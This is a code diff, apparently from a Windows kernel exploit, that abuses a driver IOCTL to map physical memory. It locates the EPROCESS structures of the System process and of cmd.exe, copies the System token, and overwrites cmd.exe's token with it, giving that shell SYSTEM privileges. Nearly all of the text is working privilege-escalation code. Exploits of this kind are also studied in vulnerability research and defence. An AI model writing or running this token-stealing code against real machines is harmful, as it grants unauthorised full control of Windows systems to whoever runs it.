@@ -50,11 +50,15 @@ int main(int argc, char** argv)
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[+] Handle to PhysicalMemory: 0x%p\n", hPhysicalMemory);
+	PVOID* buf = (PVOID*)malloc(0x1000);
+	if (buf == 0) {
+		exit(EXIT_FAILURE);
+	}
 	
 	std::vector <unsigned __int64> EPROCESS_SYSTEM;
 
 	// do some sanity checks with GetEPROCESSPhysicalBase() as there may be some false positives...
-	if (GetEPROCESSPhysicalBase("cmd.exe", 6220, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
+	if (GetEPROCESSPhysicalBase("System", 4, hPhysicalMemory, EPROCESS_SYSTEM) == -1)
 	{
 		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
 	}
@@ -67,32 +71,69 @@ int main(int argc, char** argv)
 		EPROCESS_SYSTEM_page_offset.push_back(EPROCESS_SYSTEM[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
-	PVOID* buf = (PVOID*)malloc(0x1000);
-	if (buf == 0) {
-		exit(EXIT_FAILURE);
-	}
-
-	// map EPROCESS page
-	if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[0], 0x4000, buf) == FALSE) {
-		fprintf(stderr, "[!] MapPhysicalMemory failed\n");
-		return -1;
-	}
+	unsigned __int64 systemToken = 0;
 
 	for (int i = 0; i < EPROCESS_SYSTEM_size; i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], 0x4000, buf) == FALSE) {
+			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
+			return -1;
+		}
+
 		// print Token for each EPROCESS Base
 		PVOID castedBuf = *buf;
 		castedBuf = (unsigned char*)castedBuf + EPROCESS_SYSTEM_page_offset[i];
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
+		systemToken = *(unsigned __int64*)castedBuf;
+		if (UnmapPhysicalMemory(buf) == FALSE) {
+			printf("UnmapPhysicalMemory failed\n");
+			return -1;
+		}
+	}
+
+	printf("----------------------------------------------- now for cmd.exe\n");
+
+	std::vector <unsigned __int64> EPROCESS_cmd;
+
+	if (GetEPROCESSPhysicalBase("cmd.exe", 1644, hPhysicalMemory, EPROCESS_cmd) == -1)
+	{
+		fprintf(stderr, "[!] GetEPROCESSPhysicalBase failed\n");
+	}
+
+	size_t EPROCESS_cmd_size = EPROCESS_cmd.size();
+	std::vector <unsigned __int64> EPROCESS_cmd_page;
+	std::vector <unsigned __int64> EPROCESS_cmd_page_offset;
+	for (int i = 0; i < EPROCESS_cmd_size; i++) {
+		EPROCESS_cmd_page.push_back(EPROCESS_cmd[i] & ~((unsigned __int64)-1 & 0xFFF));
+		EPROCESS_cmd_page_offset.push_back(EPROCESS_cmd[i] & (unsigned __int64)-1 & 0xFFF);
 	}
 
 
-	if (UnmapPhysicalMemory(buf) == FALSE) {
-		printf("UnmapPhysicalMemory failed\n");
-		return -1;
+	unsigned __int64 cmdToken = 0;
+
+	for (int i = 0; i < EPROCESS_cmd_size; i++) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
+			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
+			return -1;
+		}
+
+		// print Token for each EPROCESS Base
+		PVOID castedBuf = *buf;
+		castedBuf = (unsigned char*)castedBuf + EPROCESS_cmd_page_offset[i];
+		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
+		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
+		cmdToken = *(unsigned __int64*)castedBuf;
+		*(unsigned __int64*)castedBuf = systemToken; // this should do it
+		printf("[+] Replaced cmd Token with System Token\n");
+
+		if (UnmapPhysicalMemory(buf) == FALSE) {
+			printf("UnmapPhysicalMemory failed\n");
+			return -1;
+		}
 	}
+	
 
-
+	free(buf);
 	CloseHandle((HANDLE)*(PDWORD64)hPhysicalMemory);
 	CloseHandle(device);
 	return EXIT_SUCCESS;
